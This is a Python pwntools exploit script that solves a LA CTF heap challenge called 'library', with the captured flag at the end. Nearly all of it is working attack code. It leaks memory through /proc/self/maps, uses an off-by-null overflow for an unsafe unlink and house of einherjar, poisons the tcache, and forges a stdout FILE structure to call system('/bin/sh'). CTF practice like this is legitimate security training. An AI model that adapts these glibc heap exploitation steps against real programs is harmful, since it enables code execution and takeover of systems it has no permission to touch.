from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./library_patched', '''
    b *(main+306)
    b *(main+318)
    b *(main+330)
    b *(main+342)
    continue
''')

# p = remote('chall.lac.tf', 31174)

# order a book (chunk) by malloc(0x20), whose first 4 bytes is book->id (integer), then 0x10 bytes is book->name (string), and last 8 bytes is book->review (address)
def order_book(name):
    p.sendlineafter(b"choice: ", b'1')
    id = p.recvline().decode().split()[-1]
    p.sendafter(b"enter name: ", name)
    return id

# read settings->comprehension bytes of a book at id by viewing book->name as a filename, only when settings->profile is 0x1a1
def read_book(id):
    p.sendlineafter(b"choice: ", b'2')
    p.sendlineafter(b"enter id: ", str(id).encode())
    p.recvuntil(b"watch out, book incoming!\n")
    return p.recvuntil(b"\nhope you enjoyed the read :D\n", drop=True)

# add a review to a book at id by book->review = malloc(length) and book->review[read(0, book->review, length)] = 0, where there is an off-by-null overflow
def review_book_add(id, length, review):
    p.sendlineafter(b"choice: ", b'3')
    p.sendlineafter(b"enter id: ", str(id).encode())
    p.sendlineafter(b"enter review length: ", str(length).encode())
    p.sendafter(b"enter review: ", review)

# delete a review of a book at id by free(book->review)
def review_book_delete(id):
    p.sendlineafter(b"choice: ", b'3')
    p.sendlineafter(b"enter id: ", str(id).encode())
    p.sendlineafter(b"would you like to delete the current review? [Y/n] ", b'y')

# update bio by read(0, settings->profile+8, 0x10);
def manage_account_update_bio(bio):
    p.sendlineafter(b"choice: ", b'4')
    p.sendlineafter(b"would you like to update your bio? [Y/n] ", b'y')
    p.sendlineafter(b"enter bio: ", bio)
    p.sendlineafter(b"would you like to add your library card? [Y/n] ", b'n')
    p.sendafter(b"would you like to recover settings through RAIS? [Y/n]", b'n')

# add a card by settings->card = malloc(length), read(0, settings->card, length) and memcpy(&settings->id, settings->card, 0x10), which can overwrite settings->profile area
def manage_account_add_card(length, card):
    p.sendlineafter(b"choice: ", b'4')
    p.sendlineafter(b"would you like to update your bio? [Y/n] ", b'n')
    p.sendlineafter(b"would you like to add your library card? [Y/n] ", b'y')
    p.sendlineafter(b"enter card length: ", str(length).encode())
    p.sendafter(b"enter card: ", card)
    p.sendlineafter(b"would you like to recover settings through RAIS? [Y/n]", b'n')

# recover settings by reset settings global variable to correct settings chunk, whose first 8 bytes is settings->id (integer), then 0x18 bytes is settings->profile (string), then 8 bytes is settings->card (address), and then 2 bytes is settings->comprehension (integer)
def manage_account_recover_settings():
    p.sendlineafter(b"choice: ", b'4')
    p.sendlineafter(b"would you like to update your bio? [Y/n] ", b'n')
    p.sendlineafter(b"would you like to add your library card? [Y/n] ", b'n')
    p.sendlineafter(b"would you like to recover settings through RAIS? [Y/n]", b'y')

glibc_e = ELF('./libc.so.6')

# Stage 1: leak elf base address
proc_self_maps = order_book(b'/proc/self/maps')
# pass check of *(long*)settings->profile == 0x1a1
manage_account_add_card(0x18, p64(0)+p64(0x1a1))
# read settings->comprehension (0xc) bytes of file /proc/self/maps
elf_base_addr = int(read_book(proc_self_maps)[0:12].decode(), 16)
log.info(f"elf base address: {hex(elf_base_addr)}")

# Stage 2: unsafe unlink to leak heap base address and glibc base address
# why not directly house of einherjar? because heap base address is not known now and manage_account_recover_settings function is accessible
# prepare fake chunk for unsafe unlink in settings chunk: settings chunk is at heap_base_addr+0x2a0 (whose address is stored in settings global variable), and fake chunk of size 0x1a1 is at heap_base_addr+0x2b0
# elf_base_addr+0x4260-0x18 (&settings-0x18) is fd pointer of fake chunk, which satisfies the condition: fake chunk->fd->bk == fake chunk
# elf_base_addr+0x4260-0x10 (&settings-0x10) is bk pointer of fake chunk, which satisfies the condition: fake chunk->bk->fd == fake chunk
manage_account_update_bio(p64(elf_base_addr+0x4260-0x18)+p64(elf_base_addr+0x4260-0x10))
a = order_book(b'/a')
b = order_book(b'/b')
c = order_book(b'/c')
d = order_book(b'/d')
review_book_add(a, 0x38, b'A')
review_book_add(b, 0x4f8, b'B')
# avoid malloc_consolidate
review_book_add(c, 0x28, b'C')
review_book_delete(a)
# overwrite prev_size and size of chunk at heap_base_addr+0x450 with 0x1a0 (fake chunk size) and 0x500 (off-by-null overflow set prev_inuse to 0) respectively to pass check of unsafe unlink
review_book_add(a, 0x38, b'A'*0x30+p64(0x1a0))
# free chunk at heap_base_addr+0x450 to trigger unsafe unlink
# a chunk of size 0x6a0 (0x1a0+0x500) starting from fake chunk at heap_base_addr+0x2b0 is freed into unsorted bin
# fake chunk->bk->fd (&settings) is set to fake chunk->fd (&settings-0x18)
review_book_delete(b)
# overwrite settings->comprehension with 0xffff in settings chunks at heap_base_addr+0x2a0
review_book_add(d, 0x198, b'D'*0x18+p16(0xffff))
# set value of settings global variable to correct address of settings chunk at heap_base_addr+0x2a0
manage_account_recover_settings()
# read settings->comprehension (0xffff) bytes of file /proc/self/maps
leaks = read_book(proc_self_maps)
heap_base_addr = int(leaks.split(b"\n")[6].split(b"-")[0], 16)
log.info(f"heap base address: {hex(heap_base_addr)}")
glibc_base_addr = int(leaks.split(b"\n")[8].split(b"-")[0], 16)
log.info(f"glibc base address: {hex(glibc_base_addr)}")
# clear out unsorted bin
e = order_book(b'/e')
review_book_add(e, 0x448, b'E')

# Stage 3: house of einherjar for tcache poisoning to trigger FSOP
# why house of einherjar? because heap base address is known now and heap buffer overflow is not accessible
f = order_book(b'/f')
g = order_book(b'/g')
h = order_book(b'/h')
i = order_book(b'/i')
j = order_book(b'/j')
k = order_book(b'/k')
l = order_book(b'/l')
# prepare fake chunk of size 0x270 at heap_base_addr+0xae0 for house of einherjar in chunk at heap_base_addr+0xad0
review_book_add(f, 0x38, b'F'*8+p64(0x270)+p64(heap_base_addr+0xad0)*2)
# prepare two chunks of size 0x100 for tcache poisoning to trigger FSOP later
review_book_add(g, 0xf8, b'G')
review_book_add(h, 0xf8, b'H')
review_book_add(i, 0x38, b'I')
review_book_add(j, 0x4f8, b'J')
# avoid malloc_consolidate
review_book_add(k, 0x28, b'K')
review_book_delete(i)
# overwrite prev_size and size of chunk at heap_base_addr+0xd50 with 0x270 (fake chunk size) and 0x500 (off-by-null overflow set prev_inuse to 0) respectively to pass check of house of einherjar
review_book_add(i, 0x38, b'I'*0x30+p64(0x270))
# free chunk at heap_base_addr+0xd50 to trigger house of einherjar
# a chunk of size 0x770 (0x270+0x500) starting from fake chunk at heap_base_addr+0xae0 is freed into unsorted bin
review_book_delete(j)
# prepare for tcache poisoning
review_book_delete(h)
review_book_delete(g)
# notice that this payload must not overflow metadata of freed chunk in unsorted bin
review_book_add(l, 0x48, b'L'*0x28+p64(0x101)+p64(((heap_base_addr+0xb10)>>12)^(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])))
m = order_book(b'/m')
n = order_book(b'/n')
review_book_add(m, 0xf8, b'M')
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3
fake.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
# tcache poisoning to trigger FSOP
review_book_add(n, 0xf8, bytes(fake))

p.interactive()

# lactf{procfs_my_beloved_and_sendfile_my_behated}